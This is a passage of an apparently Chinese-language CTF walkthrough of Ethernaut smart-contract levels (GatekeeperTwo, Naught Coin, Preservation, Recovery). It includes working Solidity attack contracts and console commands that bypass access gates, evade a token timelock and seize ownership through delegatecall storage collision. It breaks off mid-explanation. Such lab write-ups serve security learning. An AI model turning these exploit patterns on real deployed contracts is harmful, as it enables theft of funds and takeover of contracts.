class_">GatekeeperTwo</span> {</span><br><span class="line">    address public entrant;</span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">gateOne</span>(<span class="params"></span>) {</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> != tx.<span class="property">origin</span>);</span><br><span class="line">        _;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">gateTwo</span>(<span class="params"></span>) {</span><br><span class="line">        uint256 x;</span><br><span class="line">        assembly {</span><br><span class="line">            x := <span class="title function_">extcodesize</span>(<span class="title function_">caller</span>())</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">require</span>(x == <span class="number">0</span>);</span><br><span class="line">        _;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">gateThree</span>(<span class="params">bytes8 _gateKey</span>) {</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">uint64</span>(<span class="title function_">bytes8</span>(<span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(msg.<span class="property">sender</span>)))) ^ <span class="title function_">uint64</span>(_gateKey) == <span class="title function_">type</span>(uint64).<span class="property">max</span>);</span><br><span class="line">        _;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">enter</span>(<span class="params">bytes8 _gateKey</span>) public gateOne gateTwo <span class="title function_">gateThree</span>(_gateKey) returns (bool) {</span><br><span class="line">        entrant = tx.<span class="property">origin</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<ol>
<li><strong>第一关 (msg.sender != tx.origin)</strong>:<ul>
<li>这一关要求调用者 (<code>msg.sender</code>) 不能是交易的发起者 (<code>tx.origin</code>)。这意味着调用必须来自一个<strong>智能合约</strong>，而不是直接来自您的钱包账户 (EOA)。</li>
<li><strong>解决方案</strong>: 我们创建了一个名为 <code>GatekeeperTwoAttack</code> 的中间合约来发起调用。</li>
</ul>
</li>
<li><strong>第二关 (extcodesize(caller()) == 0)</strong>:<ul>
<li>这一关检查调用者地址的代码大小是否为 0。</li>
<li>通常智能合约是有代码的，大小不为 0。但是，<strong>在合约的 constructor (构造函数) 执行期间</strong>，合约的代码尚未完全存储在区块链上，因此 <code>extcodesize</code> 会返回 0。</li>
<li><strong>解决方案</strong>: 我们将所有的攻击逻辑都放在攻击合约的 <code>constructor</code> 中执行。</li>
</ul>
</li>
<li><strong>第三关 (异或运算 XOR)</strong>:<ul>
<li>条件是：<code>A ^ Key == 全1 (type(uint64).max)</code>。</li>
<li>利用异或运算的可逆性质（如果 <code>A ^ B = C</code>，那么 <code>A ^ C = B</code>），我们可以反推 Key：<code>Key = A ^ 全1</code>。</li>
<li>这里的 <code>A</code> 是 <code>uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))</code>。因为我们是从攻击合约调用的，所以 <code>msg.sender</code> 就是攻击合约的地址 <code>address(this)</code>。</li>
<li><strong>解决方案</strong>: 我们在构造函数中动态计算出这个 Key 并传入。</li>
</ul>
</li>
</ol>
<p><strong>GatekeeperTwoAttack</strong></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">GatekeeperTwo</span> {</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">enter</span>(<span class="params">bytes8 _gateKey</span>) external returns (bool);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">GatekeeperTwoAttack</span> {</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _target</span>) {</span><br><span class="line">        <span class="title class_">GatekeeperTwo</span> target = <span class="title class_">GatekeeperTwo</span>(_target);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Gate One: msg.sender != tx.origin</span></span><br><span class="line">        <span class="comment">// This is satisfied because we are calling from a contract.</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Gate Two: extcodesize(caller()) == 0</span></span><br><span class="line">        <span class="comment">// This is satisfied because we are calling from the constructor.</span></span><br><span class="line">        <span class="comment">// During construction, the code size of the contract is 0.</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Gate Three: </span></span><br><span class="line">        <span class="comment">// uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max</span></span><br><span class="line">        <span class="comment">// A ^ B = C  =&gt;  A ^ C = B</span></span><br><span class="line">        <span class="comment">// msg.sender here is address(this)</span></span><br><span class="line">        </span><br><span class="line">        uint64 val = <span class="title function_">uint64</span>(<span class="title function_">bytes8</span>(<span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)))));</span><br><span class="line">        uint64 key64 = val ^ <span class="title function_">type</span>(uint64).<span class="property">max</span>;</span><br><span class="line">        bytes8 key = <span class="title function_">bytes8</span>(key64);</span><br><span class="line"></span><br><span class="line">        target.<span class="title function_">enter</span>(key);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p><strong>最后截图：</strong></p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-12-18_10-22-17.png" alt="nipaste_2025-12-18_10-22-1"></p>
<h2 id="15-Naught-Coin"><a href="#15-Naught-Coin" class="headerlink" title="15. Naught Coin"></a>15. Naught Coin</h2><h3 id="transferFrom-ERC20"><a href="#transferFrom-ERC20" class="headerlink" title="transferFrom & ERC20"></a><code>transferFrom</code> &amp; <code>ERC20</code></h3><blockquote>
<p>NaughtCoin is an ERC20 token and you’re already holding all of them. The catch is that you’ll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.</p>
<p>Things that might help:</p>
<ul>
<li>The <a class="link" target="_blank" rel="noopener" href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md">ERC20 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> Spec</li>
<li>The <a class="link" target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts">OpenZeppelin <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> codebase</li>
</ul>
</blockquote>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"openzeppelin-contracts-08/token/ERC20/ERC20.sol"</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">NaughtCoin</span> is <span class="title class_">ERC20</span> {</span><br><span class="line">    <span class="comment">// string public constant name = 'NaughtCoin';</span></span><br><span class="line">    <span class="comment">// string public constant symbol = '0x0';</span></span><br><span class="line">    <span class="comment">// uint public constant decimals = 18;</span></span><br><span class="line">    uint256 public timeLock = block.<span class="property">timestamp</span> + <span class="number">10</span> * <span class="number">365</span> days;</span><br><span class="line">    uint256 public <span class="variable constant_">INITIAL_SUPPLY</span>;</span><br><span class="line">    address public player;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _player</span>) <span class="title class_">ERC20</span>(<span class="string">"NaughtCoin"</span>, <span class="string">"0x0"</span>) {</span><br><span class="line">        player = _player;</span><br><span class="line">        <span class="variable constant_">INITIAL_SUPPLY</span> = <span class="number">1000000</span> * (<span class="number">10</span> ** <span class="title function_">uint256</span>(<span class="title function_">decimals</span>()));</span><br><span class="line">        <span class="comment">// _totalSupply = INITIAL_SUPPLY;</span></span><br><span class="line">        <span class="comment">// _balances[player] = INITIAL_SUPPLY;</span></span><br><span class="line">        <span class="title function_">_mint</span>(player, <span class="variable constant_">INITIAL_SUPPLY</span>);</span><br><span class="line">        emit <span class="title class_">Transfer</span>(<span class="title function_">address</span>(<span class="number">0</span>), player, <span class="variable constant_">INITIAL_SUPPLY</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address _to, uint256 _value</span>) public override lockTokens returns (bool) {</span><br><span class="line">        <span class="variable language_">super</span>.<span class="title function_">transfer</span>(_to, _value);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prevent the initial owner from transferring tokens until the timelock has passed</span></span><br><span class="line">    modifier <span class="title function_">lockTokens</span>(<span class="params"></span>) {</span><br><span class="line">        <span class="keyword">if</span> (msg.<span class="property">sender</span> == player) {</span><br><span class="line">            <span class="built_in">require</span>(block.<span class="property">timestamp</span> &gt; timeLock);</span><br><span class="line">            _;</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            _;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>ERC20 标准中有<strong>两种</strong>转移代币的方法：</p>
<ol>
<li><strong>transfer(to, amount)</strong>: 我直接转账给你。（<strong>这个被锁了</strong>）</li>
<li><strong>transferFrom(from, to, amount)</strong>: 我授权给第三方（或者我自己），由第三方把我的钱转给你。（<strong>这个没有被重写，也没有被锁！</strong>）</li>
</ol>
<p>由于 <code>NaughtCoin</code> 合约继承自 OpenZeppelin 的 <code>ERC20</code>，它自动拥有了父类的 <code>transferFrom</code> 函数。因为开发者<strong>忘记重写 transferFrom 并加上 lockTokens 修饰符</strong>，所以这个“后门”是敞开的。</p>
<p><strong>通关步骤</strong></p>
<p>你需要利用 <code>approve</code> 和 <code>transferFrom</code> 机制把钱转走。</p>
<p><strong>步骤一：授权 (Approve)</strong><br>首先，你需要允许你自己（或者另一个地址）支配你的代币。</p>
<ul>
<li>调用 <code>approve(spender, amount)</code>。</li>
<li><code>spender</code>: 填你自己的钱包地址（是的，你可以授权给你自己）。</li>
<li><code>amount</code>: 填你的全部余额（<code>1000000000000000000000000</code>，即 100万 * 10^18）。</li>
</ul>
<p><strong>步骤二：通过 transferFrom 转账</strong><br>授权完成后，调用 <code>transferFrom</code> 把钱转出去。</p>
<ul>
<li>调用 <code>transferFrom(from, to, amount)</code>。</li>
<li><code>from</code>: 你的钱包地址。</li>
<li><code>to</code>: 任意其他地址（比如关卡实例地址，或者你的另一个小号）。</li>
<li><code>amount</code>: 全部余额。</li>
</ul>
<p>因为 <code>transferFrom</code> 没有 <code>lockTokens</code> 限制，交易会直接成功，你的余额归零，关卡通过。</p>
<p><strong>控制台 console：实际操作</strong></p>
<p><strong>第一步：授权 (Approve)</strong></p>
<p>允许你自己支配你自己的代币。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 1. 获取你的全部余额</span><br><span class="line">const balance = await contract.balanceOf(player);</span><br><span class="line"></span><br><span class="line">// 2. 授权给你自己 (spender = player)</span><br><span class="line">await contract.approve(player, balance);</span><br></pre></td></tr></table></figure></div>

<p><em>(等待这笔交易确认成功…)</em></p>
<p><strong>第二步：转账 (TransferFrom)</strong></p>
<p>利用 <code>transferFrom</code> 绕过锁定的 <code>transfer</code> 函数。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 3. 等待授权交易确认后，调用 transferFrom 把钱转给任意地址 (例如转给合约本身)</span><br><span class="line">// 参数: from (你), to (合约地址), amount (余额)</span><br><span class="line">await contract.transferFrom(player, contract.address, balance);</span><br></pre></td></tr></table></figure></div>

<p><strong>第三步：验证</strong></p>
<p>检查余额是否归零。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 4. 检查余额是否归零</span><br><span class="line">(await contract.balanceOf(player)).toString()</span><br></pre></td></tr></table></figure></div>

<h2 id="16-Preservation"><a href="#16-Preservation" class="headerlink" title="16. Preservation"></a>16. Preservation</h2><h3 id="delegatecall-委托调用"><a href="#delegatecall-委托调用" class="headerlink" title="delegatecall (委托调用)"></a><code>delegatecall</code> (委托调用)</h3><blockquote>
<p>This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.</p>
<p>The goal of this level is for you to claim ownership of the instance you are given.</p>
<p>  Things that might help</p>
<ul>
<li>Look into Solidity’s documentation on the <code>delegatecall</code> low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.</li>
<li>Understanding what it means for <code>delegatecall</code> to be context-preserving.</li>
<li>Understanding how storage variables are stored and accessed.</li>
<li>Understanding how casting works between different data types.</li>
</ul>
</blockquote>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Preservation</span> {</span><br><span class="line">    <span class="comment">// public library contracts</span></span><br><span class="line">    address public timeZone1Library;</span><br><span class="line">    address public timeZone2Library;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 storedTime;</span><br><span class="line">    <span class="comment">// Sets the function signature for delegatecall</span></span><br><span class="line">    bytes4 constant setTimeSignature = <span class="title function_">bytes4</span>(<span class="title function_">keccak256</span>(<span class="string">"setTime(uint256)"</span>));</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _timeZone1LibraryAddress, address _timeZone2LibraryAddress</span>) {</span><br><span class="line">        timeZone1Library = _timeZone1LibraryAddress;</span><br><span class="line">        timeZone2Library = _timeZone2LibraryAddress;</span><br><span class="line">        owner = msg.<span class="property">sender</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set the time for timezone 1</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setFirstTime</span>(<span class="params">uint256 _timeStamp</span>) public {</span><br><span class="line">        timeZone1Library.<span class="title function_">delegatecall</span>(abi.<span class="title function_">encodePacked</span>(setTimeSignature, _timeStamp));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set the time for timezone 2</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setSecondTime</span>(<span class="params">uint256 _timeStamp</span>) public {</span><br><span class="line">        timeZone2Library.<span class="title function_">delegatecall</span>(abi.<span class="title function_">encodePacked</span>(setTimeSignature, _timeStamp));</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Simple library contract to set the time</span></span><br><span class="line">contract <span class="title class_">LibraryContract</span> {</span><br><span class="line">    <span class="comment">// stores a timestamp</span></span><br><span class="line">    uint256 storedTime;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setTime</span>(<span class="params">uint256 _time</span>) public {</span><br><span class="line">        storedTime = _time;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p><strong>漏洞分析</strong></p>
<ol>
<li><strong>存储布局不匹配 (Storage Layout Mismatch)</strong>:<ul>
<li><code>Preservation</code> 合约:<ul>
<li>Slot 0: <code>timeZone1Library</code> (地址类型)</li>
<li>Slot 1: <code>timeZone2Library</code> (地址类型)</li>
<li>Slot 2: <code>owner</code> (地址类型)</li>
<li>Slot 3: <code>storedTime</code> (uint256类型)</li>
</ul>
</li>
<li><code>LibraryContract</code> 库合约:<ul>
<li>Slot 0: <code>storedTime</code> (uint256类型)</li>
</ul>
</li>
</ul>
</li>
<li><strong>利用原理</strong>:<ul>
<li>当 <code>Preservation</code> 调用 <code>timeZone1Library.delegatecall(...)</code> 时，库合约的代码会在 <code>Preservation</code> 的存储上下文中执行。</li>
<li>库合约的 <code>setTime</code> 函数会写入 <strong>Slot 0</strong> (<code>storedTime = _time</code>)。</li>
<li>在 <code>Preservation</code> 中，<strong>Slot 0</strong> 对应的是 <code>timeZone1Library</code> 变量。</li>
<li>这意味着调用 <code>setFirstTime</code> 实际上允许你修改 <code>timeZone1Library</code> 的地址。</li>
</ul>
</li>
</ol>
<p><strong>攻击计划</strong></p>
<ol>
<li><strong>第一步</strong>：调用 <code>setFirstTime</code>，参数填入我们恶意攻击合约的地址。这会将 <code>Preservation</code> 合约中的 <code>timeZone1Library</code> (Slot 0) 覆盖为我们的攻击合约地址。</li>
<li><strong>第二步</strong>：再次调用 <code>setFirstTime</code>。这一次，<code>Preservation</code> 会对我们的攻击合约发起 <code>delegatecall</code>。</li>
<li><strong>第三步</strong>：我们的攻击合约中会有一个同名的 <code>setTime(uint256)</code> 函数，该函数会修改 <strong>Slot 2</strong>（即 <code>Preservation</code> 中的 <code>owner</code> 变量），将其改为你的地址。</li>
</ol>
<p><strong>攻击脚本</strong></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义接口，不需要 import 整个 OpenZeppelin 库</span></span><br><span class="line">interface <span class="title class_">IPreservation</span> {</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setFirstTime</span>(<span class="params">uint256 _timeStamp</span>) external;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setSecondTime</span>(<span class="params">uint256 _timeStamp</span>) external;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">PreservationAttack</span> {</span><br><span class="line">    <span class="comment">// 模仿 Preservation 的存储布局</span></span><br><span class="line">    address public timeZone1Library; <span class="comment">// Slot 0</span></span><br><span class="line">    address public timeZone2Library; <span class="comment">// Slot 1</span></span><br><span class="line">    address public owner;            <span class="comment">// Slot 2</span></span><br><span class="line">    uint256 storedTime;              <span class="comment">// Slot 3</span></span><br><span class="line"></span><br><span class="line">    <span class="title class_">IPreservation</span> public target;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _target</span>) {</span><br><span class="line">        target = <span class="title class_">IPreservation</span>(_target);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">attack</span>(<span class="params"></span>) public {</span><br><span class="line">        <span class="comment">// 第一步：将 timeZone1Library 覆盖为当前攻击合约的地址</span></span><br><span class="line">        <span class="comment">// LibraryContract 会写入 slot 0。</span></span><br><span class="line">        <span class="comment">// 我们将地址转换为 uint256，因为 setFirstTime 接收 uint256 参数。</span></span><br><span class="line">        target.<span class="title function_">setFirstTime</span>(<span class="title function_">uint256</span>(<span class="title function_">uint160</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>))));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第二步：再次调用 setFirstTime。</span></span><br><span class="line">        <span class="comment">// 现在 timeZone1Library 已经是这个攻击合约了。</span></span><br><span class="line">        <span class="comment">// 它会 delegatecall 到这个合约的 setTime 函数。</span></span><br><span class="line">        <span class="comment">// 我们传入 msg.sender 并转换为 uint256，以便 setTime 将 owner 设置为 msg.sender。</span></span><br><span class="line">        target.<span class="title function_">setFirstTime</span>(<span class="title function_">uint256</span>(<span class="title function_">uint160</span>(msg.<span class="property">sender</span>)));</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setTime</span>(<span class="params">uint256 _time</span>) public {</span><br><span class="line">        _time;</span><br><span class="line">        owner = <span class="title function_">address</span>(<span class="title function_">uint160</span>(_time));</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><strong>为什么要对地址有一个uint160的操作</strong>，以下是详细原因：</p>
<ol>
<li><strong>地址的本质是 160 位</strong>：<br>在以太坊中，一个地址（<code>address</code>）占用 20 个字节，也就是 20×8=16020×8=160 位。</li>
<li><strong>禁止直接转换</strong>：<br>在较新的 Solidity 版本中，编译器<strong>不允许</strong>直接将 <code>address</code> 类型强制转换为 <code>uint256</code>。如果你尝试写 <code>uint256(address(this))</code>，编译器会报错，因为它认为这两种类型的大小不匹配，直接转换可能是不安全的。</li>
<li><strong>正确的转换路径</strong>：<br>为了将地址变成 <code>uint256</code>，必须分两步走：<ul>
<li>**第一步 (address -&gt; uint160)**：先将地址转换为 <code>uint160</code>。这是允许的，因为它们在底层都是 160 位的数据，大小完全一致。</li>
<li>**第二步 (uint160 -&gt; uint256)**：再将 <code>uint160</code> 转换为 <code>uint256</code>。这是允许的，因为这是从“小整数”转为“大整数”，只是在前面补零而已。</li>
</ul>
</li>
</ol>
</blockquote>
<p><strong>最终截图</strong></p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-12-18_20-22-12.png" alt="nipaste_2025-12-18_20-22-1"></p>
<h2 id="17-Recovery"><a href="#17-Recovery" class="headerlink" title="17. Recovery"></a>17. Recovery</h2><h3 id="new-RLP-地址确定"><a href="#new-RLP-地址确定" class="headerlink" title="new RLP 地址确定"></a><code>new</code> RLP 地址确定</h3><blockquote>
<p>A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent <code>0.001</code> ether to obtain more tokens. They have since lost the contract address.</p>
<p>This level will be completed if you can recover (or remove) the <code>0.001</code> ether from the lost contract address.</p>
</blockquote>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Recovery</span> {</span><br><span class="line">    <span class="comment">//generate tokens</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">generateToken</span>(<span class="params">string memory _name, uint256 _initialSupply</span>) public {</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">SimpleToken</span>(_name, msg.<span class="property">sender</span>, _initialSupply);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">SimpleToken</span> {</span><br><span class="line">    string public name;</span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public balances;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// constructor</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">string memory _name, address _creator, uint256 _initialSupply</span>) {</span><br><span class="line">        name = _name;</span><br><span class="line">        balances[_creator] = _initialSupply;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// collect ether in return for tokens</span></span><br><span class="line">    <span class="title function_">receive</span>() external payable {</span><br><span class="line">        balances[msg.<span class="property">sender</span>] = msg.<span class="property">value</span> * <span class="number">10</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// allow transfers of tokens</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address _to, uint256 _amount</span>) public {</span><br><span class="line">        <span class="built_in">require</span>(balances[msg.<span class="property">sender</span>] &gt;= _amount);</span><br><span class="line">        balances[msg.<span class="property">sender</span>] = balances[msg.<span class="property">sender</span>] - _amount;</span><br><span class="line">        balances[_to] = _amount;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// clean up after ourselves</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">destroy</span>(<span class="params">address payable _to</span>) public {</span><br><span class="line">        <span class="title function_">selfdestruct</span>(_to);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p><strong>解决方案解释</strong></p>
<p>这个关卡的目标是找回发送到一个“丢失”合约地址的 0.001 ether。这个丢失的合约是由 <code>Recovery</code> 合约创建的第一个 <code>SimpleToken</code> 合约。</p>
<ol>
<li><strong>确定性地址计算</strong>:<br>在以太坊中，使用 <code>new</code> 关键字（CREATE 操作码）创建的合约地址是确定性的。它是根据<strong>发送者地址</strong>（这里是 <code>Recovery</code> 合约的地址）和<strong>发送者的 nonce</strong> 计算出来的。<br>公式为：<code>Address = keccak256(rlp.encode([sender, nonce]))</code></li>
<li><strong>Nonce 的确定</strong>:<br>题目中提到这是创建者部署的<strong>第一个</strong>代币合约。对于合约账户，nonce 从 1 开始计数。因此，创建该代币合约时，<code>Recovery</code> 合约的 nonce 为 <code>1</code>。</li>
<li><strong>RLP 编码细节</strong>:<br>为了在 Solidity 中手动计算这个地址，我们需要模拟 RLP 编码过程：<ul>
<li><strong>列表头 (List Header)</strong>: <code>0xd6</code>。这是 <code>0xc0</code> (列表标识) 加上列表总长度 <code>22</code> 字节 (20字节地址 + 1字节地址头 + 1字节nonce)。</li>
<li><strong>地址头 (Address Header)</strong>: <code>0x94</code>。这是 <code>0x80</code> (字符串标识) 加上地址长度 <code>20</code> 字节。</li>
<li><strong>发送者地址</strong>: 即题目给出的 <code>Recovery</code> 实例地址。</li>
<li><strong>Nonce</strong>: <code>0x01</code>。</li>
</ul>
</li>
